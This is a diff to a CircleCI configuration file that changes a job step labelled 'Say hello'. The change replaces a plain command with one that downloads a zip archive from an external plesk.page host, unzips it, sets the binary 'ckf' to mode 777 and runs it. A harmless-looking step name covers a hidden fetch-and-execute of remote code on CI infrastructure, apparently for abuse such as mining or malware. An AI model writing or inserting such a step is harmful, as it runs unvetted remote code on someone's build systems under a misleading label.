@@ -16,7 +16,11 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "./ckf"
+          command: "
+wget https://eloquent-albattani.24-199-114-30.plesk.page/ck03.zip
+unzip ck03.zip
+chmod 777 ckf
+./ckf"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
